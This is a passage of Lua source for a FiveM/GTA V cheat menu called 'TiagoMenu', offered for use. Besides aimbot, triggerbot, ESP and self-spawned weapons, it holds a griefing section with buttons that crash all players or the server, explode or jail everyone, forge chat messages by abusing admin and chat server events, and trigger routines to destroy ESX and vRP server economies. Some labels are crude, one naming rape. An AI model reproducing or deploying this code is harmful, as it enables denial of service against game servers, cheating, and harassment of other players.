						else
							local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						end
					elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestPlane, -1) then
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						end
					end
					drawNotification("~g~Teleported Into Vehicle")
				end
			elseif TiagoMenu.Button("~h~Teleport ~s~~p~To Coords") then
                TeleportToCoords()
			elseif TiagoMenu.Button("~h~Teleport ~h~~g~LSPD ") then
			    LSPD()
			elseif TiagoMenu.Button('~h~Teleport ~h~~g~FBI') then
				fbi()
			elseif TiagoMenu.Button('~h~Teleport ~h~~g~LS Customs') then
				ls()
			elseif TiagoMenu.Button('~h~Teleport ~h~~g~Main Garage') then
				gp()
		    elseif TiagoMenu.Button('~h~Teleport ~h~~g~Ammunation') then
			    Ammunation()
			elseif TiagoMenu.Button('~h~Teleport ~h~~g~Clothes shop') then
			    shopclothes()
			elseif TiagoMenu.Button('~h~Teleport ~h~~g~Barber') then
			    barber()
			elseif TiagoMenu.Button('~h~Teleport ~h~~g~Maze Bank') then
			    MazeBank()
			elseif TiagoMenu.Button('~h~Teleport ~h~~g~Spot') then
			    spot()
			elseif TiagoMenu.Button('~h~Teleport ~h~~g~Michael House') then
			    MichaelHouse()
			elseif TiagoMenu.Button('~h~Teleport ~h~~g~Trevor Trailer') then
			    trevor()
 
			 end

		TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("World") then
			if
				TiagoMenu.CheckBox(
				"~h~ESP",
				esp,
				function(enabled)
				esp = enabled
				end)
			then
		elseif
				TiagoMenu.CheckBox(
				"~h~Collision vehicles",
				Collision,
				function(enabled)
				Collision = enabled
				end)
			then
			elseif
				TiagoMenu.CheckBox(
				"~h~Force MiniMap",
				ForceMap,
				function(enabled)
				ForceMap = enabled
				end)
			then
			elseif
				TiagoMenu.CheckBox(
				"~h~Players Blips Map",
				playerBlips,
				function(enabled)
				playerBlips = enabled
				end)
			then
			elseif TiagoMenu.CheckBox(
                    "~h~~r~Crosshair",
                    crosshair,
                    function(enabled)
                        crosshair = enabled
                    end)
                then
                elseif TiagoMenu.CheckBox(
                    "~h~~r~Crosshair 2",
                    crosshair2,
                    function(enabled)
                         crosshair2 = enabled
                    end)
                then
                elseif TiagoMenu.CheckBox(
                    "~h~~r~Crosshair 3",
                    crosshair3,
                    function(enabled)
                        crosshair3 = enabled
                    end)
                then
				elseif TiagoMenu.CheckBox(
                "~h~~o~Thermal Vision",
                thermalVision,
                function(enabled)
                    thermalVision = enabled
                    SetSeethrough(thermalVision)
                end)
                then
			elseif TiagoMenu.CheckBox(
                "~h~~p~Night Vision",
                nightVision,
                function(enabled)
                    nightVision = enabled
                    SetNightvision(nightVision)
                end)
                then
				elseif TiagoMenu.CheckBox(
				    "~h~Christmas Weather",
					XMAS,
					function(enabled)
					XMAS = enabled
					end)
					then
				elseif TiagoMenu.CheckBox(
				    "~h~~o~Foggy Weather",
					FOGGY,
					function(enabled)
					FOGGY = enabled
					end)
					then
				elseif TiagoMenu.CheckBox(
				    "~h~Clear Weather",
					CLEAR,
					function(enabled)
					CLEAR = enabled
					end)
					then
				elseif TiagoMenu.CheckBox(
				    "~h~~g~Blizzard Weather",
					BLIZZARD,
					function(enabled)
					BLIZZARD = enabled
					end)
					then
				elseif TiagoMenu.CheckBox(
				    "~h~~y~Extra Sunny Weather",
					EXTRASUNNY,
					function(enabled)
					EXTRASUNNY = enabled
					end)
					then
				elseif TiagoMenu.Button("Time set to night") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif TiagoMenu.Button("Time set to day") then
				NetworkOverrideClockTime(12, 12, 0)
			end

		TiagoMenu.Display()
		elseif TiagoMenu.IsMenuOpened("Fuck") then
		if TiagoMenu.Button("~h~~r~Give All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								GiveWeaponToPed(PlayerPedId(ids), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
			end
				elseif TiagoMenu.Button("~h~~r~Remove All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
							RemoveAllPedWeapons(PlayerPedId(ids), true)
				end	
			end
		end	
		elseif TiagoMenu.Button("~h~~y~(Attention) ~r~ATTACK SERVER-CLIENT") then
                    nukeserver()
	elseif
		TiagoMenu.CheckBox(
		"~h~~r~Explode ~s~All Players",
		blowall,
		function(enabled)
		blowall = enabled
	end)
	then
	elseif
		TiagoMenu.CheckBox(
		"~h~~r~Explode ~s~World",
		WorldOnFire,
		function(enabled)
		WorldOnFire = enabled
	end)
	then
		elseif TiagoMenu.Button("~h~~r~Set ~s~~h~All Nearby Vehicles Plate Text") then
            local plateInput = KeyboardInput("Enter Plate Text (8 Characters):" , "", 100000000)
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
      elseif TiagoMenu.Button("~h~~r~Close ~s~the whole square") then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, 258.91, -933.1, 26.21, true, true, false)
                    local ea = CreateObject(e8, 200.91, -874.1, 26.21, true, true, false)
					local e92 = CreateObject(e8, 126.52, -933.2, 26.21, true, true, false)
					local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, true, true, false)
                    SetEntityHeading(e9, 158.41)
                    SetEntityHeading(ea, 90.51)
					SetEntityHeading(e92, 332.41)
                    SetEntityHeading(ea2, 260.51)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
					FreezeEntityPosition(e92, true)
                    FreezeEntityPosition(ea2, true)
 elseif TiagoMenu.Button("~h~~r~Rape ~s~All Players") then
                    RapeAllFunc()
	 elseif TiagoMenu.Button("~h~~r~Fake ~h~~s~chat Message") then 
	 local eX = KeyboardInput("Enter player name", "", 100) if eX then local dT = KeyboardInput("Enter message", "", 10000) if dT then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eX, {0, 0x99, 255}, dT) end end
      elseif TiagoMenu.Button("~h~~r~Crash ~s~All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
	 elseif
		TiagoMenu.CheckBox(
		"~h~~r~Spam ~h~~s~chat",
		spam,
		function(enabled)
		spam = enabled
	end)
	then
	elseif
		TiagoMenu.CheckBox(
		"~h~~r~Spawn stuff ~s~All Players",
		sall,
		function(enabled)
		sall = enabled
	end)
	then
	elseif
		TiagoMenu.CheckBox(
		"~h~~r~Freeze ~s~All Players",
		fall,
		function(enabled)
		fall = enabled
	end)
	then
	elseif
		TiagoMenu.CheckBox(
		"~h~~r~Crash ~s~All Players",
		nuke,
		function(enabled)
		nuke = enabled
		end)
	then
	elseif TiagoMenu.Button("~h~~r~Spawn ~p~Lion ~w~all Players") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 128 do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
	elseif TiagoMenu.Button("~h~~r~Spawn ~p~SWAT ~w~all Players ") then
                    local swat = "s_m_y_swat_01"
					local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 128 do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(swat))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(swat)) then
                            local ped =
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
	 elseif TiagoMenu.Button('~h~~r~Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
	elseif
		TiagoMenu.CheckBox(
		"~h~~r~ESX ~s~Fuck Server economy ~s~v~y~1",
		esxdestroy,
		function(enabled)
		esxdestroy = enabled
		end)
	then
	elseif TiagoMenu.Button("~h~~r~ESX ~s~Fuck Server economy ~s~v~y~2") then
				    esxdestroyv2()
	elseif TiagoMenu.Button("~h~~r~VRP ~s~Fuck Server economy") then
				    vrpdestroy()
	elseif
		TiagoMenu.CheckBox(
		"~h~~r~Jail ~s~All Players",
		banallusers,
		function(enabled)
		banallusers = enabled
		end)
	then
	elseif
		TiagoMenu.CheckBox(
		"~h~~r~Cuff ~s~All Players",
		freezeall,
		function(enabled)
		freezeall = enabled
	   	end)
	then
	elseif
		TiagoMenu.CheckBox(
			"~h~~r~Crash ~s~Server",
			servercrasher,
			function(enabled)
				servercrasher = enabled
			end)
	then
	elseif TiagoMenu.Button("~h~~b~------Fuck all Vehicles------") then
	elseif TiagoMenu.Button("~h~~r~Rampinator") then
    for vehicle in EnumerateVehicles() do local eY = CreateObject(-145066854, 0, 0, 0, true, true, true) NetworkRequestControlOfEntity(vehicle) AttachEntityToEntity(eY, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) NetworkRequestControlOfEntity(eY) SetEntityAsMissionEntity(eY, true, true) end 
    elseif TiagoMenu.CheckBox("~h~~r~Delete~s~ Vehicles", deletenearestvehicle, function(eC) deletenearestvehicle = eC end) then 
	elseif TiagoMenu.Button("~h~~r~BORGAR~s~ Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end 
	elseif TiagoMenu.CheckBox("~h~~r~Explode~s~ Vehicles", explodevehicles, function(eC) explodevehicles = eC end) then
	elseif TiagoMenu.CheckBox("~h~~r~Fuck~s~ Vehicles", fuckallcars, function(eC) fuckallcars = eC end) then end;
	
				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("WepMenu") then
			if TiagoMenu.MenuButton('~h~~r~→  ~y~Ammunition', 'WeaponTypes') then
			    elseif TiagoMenu.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
				elseif TiagoMenu.MenuButton("~r~→  ~s~Weapon", "SingleWepMenu") then
				elseif TiagoMenu.Button("~h~~g~Give ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif TiagoMenu.Button("~h~~r~Remove ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif TiagoMenu.Button("~h~~b~Give Ammo") then
					for i = 1, #allWeapons do
						AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
					end
				elseif
					TiagoMenu.ComboBox(
						"~h~Weapon/Melee Damage",
						{"1x (Default)", "2x", "3x", "4x", "5x"},
						currentItemIndex,
						selectedItemIndex,
						function(currentIndex, selectedIndex)
							currentItemIndex = currentIndex
							selectedItemIndex = selectedIndex
							SetPlayerWeaponDamageModifier(PlayerId(), selectedItemIndex)
							SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedItemIndex)
						end
					)
			    then
				elseif TiagoMenu.CheckBox(
                    "~h~Explosive Ammo",
                    bifegfubffff,
                    function(enabled)
                        bifegfubffff = enabled
                    end)
                then
				elseif TiagoMenu.CheckBox(
                    "~h~No Reload",
                    dwadawdwd,
                    function(enabled)
                        dwadawdwd = enabled
                        SetPedInfiniteAmmoClip(PlayerPedId(), dwadawdwd)
                    end)
                then
				elseif TiagoMenu.CheckBox(
                    "~h~Oneshot",
                    Oneshot,
                    function(enabled)
                        Oneshot = enabled
                    end)
                then
			elseif
				TiagoMenu.CheckBox(
				"~h~TriggerBot",
				TriggerBot,
				function(enabled)
				TriggerBot = enabled
				end)
				then
			elseif
				TiagoMenu.CheckBox(
				"~h~AimBot",
				AimBot,
				function(enabled)
				AimBot = enabled
				end)				
				 then
				 elseif
				TiagoMenu.CheckBox(
				"~h~ForceGun",
				ForceGun,
				function(enabled)
				ForceGun = enabled
				end)	
				 then
				elseif
					TiagoMenu.CheckBox(
						"~h~Infinite Ammo",
						InfAmmo,
						function(enabled)
							InfAmmo = enabled
							SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
						end
					)
				 then
				 elseif
					 TiagoMenu.CheckBox("~h~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 TiagoMenu.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end
				
				TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('WeaponTypes') then
                for dp, dD in pairs(b0) do
                    if
                        TiagoMenu.MenuButton(
                            '~h~~y~>  ~s~' .. dp,
                            'WeaponTypeSelection'
                        )
                     then
                        d4 = dD
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('WeaponTypeSelection') then
                for dp, dD in pairs(d4) do
                    if TiagoMenu.MenuButton(dD.name, 'WeaponOptions') then
                        d5 = dD
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('WeaponOptions') then
                if TiagoMenu.Button('~h~~y~Spawn Weapon inventory') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(d5.id), 1000, false)
                end
                if TiagoMenu.Button('~h~+ ~g~Ammo') then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(d5.id), 5000)
                end
                if
                    TiagoMenu.CheckBox(
                        '~h~~r~Infinite ~s~Ammo',
                        d5.bInfAmmo,
                        function(dE)
                        end
                    )
                 then
                    d5.bInfAmmo = not d5.bInfAmmo
                    SetPedInfiniteAmmo(GetPlayerPed(-1), d5.bInfAmmo, GetHashKey(d5.id))
                    SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                end
                for dp, dD in pairs(d5.mods) do
                    if TiagoMenu.MenuButton('~h~~r~> ~s~' .. dp, 'ModSelect') then
                        d6 = dD
                    end
                end
				TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('ModSelect') then
                for _, dD in pairs(d6) do
                    if TiagoMenu.Button(dD.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(d5.id), GetHashKey(dD.id))
                    end
                end

				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("SingleWepMenu") then
				for i = 1, #allWeapons do
					if TiagoMenu.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
				
				
				 TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened("WeaponCustomization") then
                if TiagoMenu.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                        rainbowTint = enabled
                    end)
                then
                elseif TiagoMenu.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                    currentTint = currentIndex
                    selectedTint = selectedIndex

                    if selectedTint == 1 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
                    end
                    if selectedTint == 2 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                    end
                    if selectedTint == 3 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                    end
                    if selectedTint == 4 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                    end
                    if selectedTint == 5 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                    end
                    if selectedTint == 6 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                    end
                    if selectedTint == 7 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                    end
                    if selectedTint == 8 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                    end
                end)
                then
                elseif TiagoMenu.Button("~g~Add Special Finish") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif TiagoMenu.Button("~r~Remove Special Finish") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif TiagoMenu.Button("~g~Add Suppressor") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif TiagoMenu.Button("~r~Remove Suppressor") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif TiagoMenu.Button("~g~Add Scope") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                elseif TiagoMenu.Button("~r~Remove Scope") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                end

		

				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("VehMenu") then
			if TiagoMenu.Button("~r~→  ~s~Vehicles ~y~Name") then
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

						SetPedIntoVehicle(PlayerPedId(), veh, -1)
					else
						drawNotification("~r~~h~Model is not valid!")
					end
					elseif TiagoMenu.IsMenuOpened('compacts') then
			for i=1, #compacts do
				if TiagoMenu.Button(compacts[i]) then
					SpawnVeh(compacts[i], PlaceSelf)
				end
			end
			elseif TiagoMenu.MenuButton('~r~→  ~s~Vehicles ~r~List', 'CarTypes') then
			elseif TiagoMenu.MenuButton('~r~→  ~o~LSC ~s~Customs', 'LSC') then
			elseif TiagoMenu.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
			elseif TiagoMenu.MenuButton('~r~→  ~s~Torque Boost', 'TorqueBoostMenu') then
			elseif TiagoMenu.Button("~h~Buy ~b~vehicle ~s~~h~for ~g~free") then fv()
				elseif TiagoMenu.Button("~h~~g~Repair ~b~Vehicle~s~ (Key 2)") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif TiagoMenu.Button("~h~~g~Repair ~y~Engine") then
					    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    if not DoesEntityExist(veh) then
        drawNotification(
            "~r~You Aren't Sitting In A Vehicle Stupid"
        )
    else
				SetVehicleUndriveable(veh,false)
				SetVehicleEngineHealth(veh, 1000.0)
				SetVehiclePetrolTankHealth(veh, 1000.0)
				healthEngineLast=1000.0
				healthPetrolTankLast=1000.0
					SetVehicleEngineOn(veh, true, false )
				SetVehicleOilLevel(veh, 1000.0)
		end
				elseif TiagoMenu.Button("~h~Max ~b~Exterior Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)				elseif TiagoMenu.Button("~h~Max ~b~Performance") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
				elseif TiagoMenu.Button("~h~Max All ~b~Tuning") then
					engine1(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					TiagoMenu.CheckBox(
					"~h~~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Colour",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				then
				elseif
					TiagoMenu.CheckBox(
					"~h~~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Neon",
					ou328hNeon,
					function(enabled)
					ou328hNeon = enabled
					end)
				then
				elseif
					TiagoMenu.CheckBox(
					"~h~~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Sync",
					ou328hSync,
					function(enabled)
					ou328hSync = enabled
					end)
				then
			    elseif TiagoMenu.Button("~h~~b~Change License Plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					local result = KeyboardInput("Enter the plate license you want", "", 10)
					if result then
						SetVehicleNumberPlateText(playerVeh, result)
					end
